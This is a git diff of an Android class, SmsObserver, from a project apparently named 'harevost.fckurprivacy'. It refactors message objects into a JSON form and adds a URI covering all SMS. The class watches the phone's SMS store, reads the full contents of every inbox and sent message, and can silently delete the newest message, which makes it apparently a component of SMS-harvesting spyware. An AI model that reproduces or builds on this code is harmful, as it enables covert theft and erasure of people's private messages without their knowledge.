@@ -10,6 +10,8 @@ import android.os.Handler;
 import android.provider.Telephony;
 import android.util.Log;
 
+import com.vergermiya.harevost.fckurprivacy.Util.JsonBuilder;
+
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 
@@ -26,6 +28,7 @@ public class SmsObserver extends ContentObserver {
 
     public static Uri SMS_INBOX = Uri.parse("content://sms/inbox");
     public static Uri SMS_SENT = Uri.parse("content://sms/sent");
+    public static Uri SMS_ALL = Uri.parse("content://sms");
 
     public SmsObserver(Context context, Handler handler) {
         super(handler);
@@ -39,28 +42,28 @@ public class SmsObserver extends ContentObserver {
         if (mCallbackCount % 3 == 0) { mCallbackCount = 0; }
         mCallbackCount += 1;
 
-        ArrayList<SmsInfo> allInboxSms = new ArrayList<>();
-        ArrayList<SmsInfo> allSentSms = new ArrayList<>();
-        SmsInfo latestInboxSms = new SmsInfo();
-        SmsInfo latestSentSms = new SmsInfo();
+        ArrayList<SmsJson> allInboxSms = new ArrayList<>();
+        ArrayList<SmsJson> allSentSms = new ArrayList<>();
+        SmsJson latestInboxSms = new SmsJson();
+        SmsJson latestSentSms = new SmsJson();
 
         Log.d("Sms onChange", "mRunCount=" + mRunCount);
         Log.d("Sms onChange", "mCallbackCount=" + mCallbackCount);
 
         if (mRunCount <= 1) {
-            allInboxSms = querySmsInfo(mContext, SMS_INBOX);
-            allSentSms = querySmsInfo(mContext, SMS_SENT);
-            for (SmsInfo sms : allInboxSms) {
+            allInboxSms = querySmsJson(mContext, SMS_INBOX);
+            allSentSms = querySmsJson(mContext, SMS_SENT);
+            for (SmsJson sms : allInboxSms) {
                 Log.d("Sms onChange", "allInboxSms:" + sms);
             }
 
-            for (SmsInfo sms : allSentSms) {
+            for (SmsJson sms : allSentSms) {
                 Log.d("Sms onChange", "allSentSms:" + sms);
             }
         } else {
             if (mCallbackCount % 3 == 0) {
-                latestInboxSms = getLatestSmsInfo(mContext, SMS_INBOX);
-                latestSentSms = getLatestSmsInfo(mContext, SMS_SENT);
+                latestInboxSms = getLatestSmsJson(mContext, SMS_INBOX);
+                latestSentSms = getLatestSmsJson(mContext, SMS_SENT);
                 Log.d("Sms onChange", "latestInboxSms:" + latestInboxSms);
                 Log.d("Sms onChange", "latestSentSms:" + latestSentSms);
             }
@@ -69,8 +72,8 @@ public class SmsObserver extends ContentObserver {
         mRunCount += 1;
     }
 
-    public static ArrayList<SmsInfo> querySmsInfo(Context context, Uri mUri) {
-        ArrayList<SmsInfo> smsInfos = new ArrayList<>();
+    public static ArrayList<SmsJson> querySmsJson(Context context, Uri mUri) {
+        ArrayList<SmsJson> smsJsons = new ArrayList<>();
         ContentResolver contentResolver = context.getContentResolver();
         Uri uri = mUri;
 
@@ -88,7 +91,7 @@ public class SmsObserver extends ContentObserver {
             while (c.moveToNext()) {
                 String phoneNumber = c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS));
 
-                int smsThreadId = c.getInt(c.getColumnIndex(Telephony.Sms.THREAD_ID));
+                String smsThreadId = c.getString(c.getColumnIndex(Telephony.Sms.THREAD_ID));
 
                 long smsDateLong = c.getLong(c.getColumnIndex(Telephony.Sms.DATE));
                 SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
@@ -99,12 +102,12 @@ public class SmsObserver extends ContentObserver {
 
                 String smsBody = c.getString(c.getColumnIndex(Telephony.Sms.BODY));
 
-                SmsInfo mSmsInfo = new SmsInfo(phoneNumber, smsThreadId, smsDate, smsType[smsTypeInt - 1], smsBody);
-                smsInfos.add(mSmsInfo);
+                SmsJson mSmsJson = new SmsJson(phoneNumber, smsThreadId, smsDate, smsType[smsTypeInt - 1], smsBody);
+                smsJsons.add(mSmsJson);
             }
         }
         c.close();
-        return smsInfos;
+        return smsJsons;
     }
 
     public static void deleteLatestSms(Context context, Uri uri) {
@@ -124,19 +127,19 @@ public class SmsObserver extends ContentObserver {
             if (c.moveToFirst()) {
                 String smsId = c.getString(c.getColumnIndex(Telephony.Sms._ID));
                 contentResolver.delete(uri, "_id=?", new String[]{smsId + ""});
-                Log.d("smsInfo", smsId + ":" + c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS)));
+                Log.d("SmsJson", smsId + ":" + c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS)));
             }
         }
         c.close();
     }
 
-    public static SmsInfo getLatestSmsInfo(Context context, Uri uri) {
-        SmsInfo mSmsInfo = new SmsInfo();
-        ArrayList<SmsInfo> smsInfos = querySmsInfo(context, uri);
-        if (!smsInfos.isEmpty()) {
-            mSmsInfo = smsInfos.get(0);
+    public static SmsJson getLatestSmsJson(Context context, Uri uri) {
+        SmsJson mSmsJson = new SmsJson();
+        ArrayList<SmsJson> smsJsons = querySmsJson(context, uri);
+        if (!smsJsons.isEmpty()) {
+            mSmsJson = smsJsons.get(0);
         }
-        return mSmsInfo;
+        return mSmsJson;
     }
 
 }
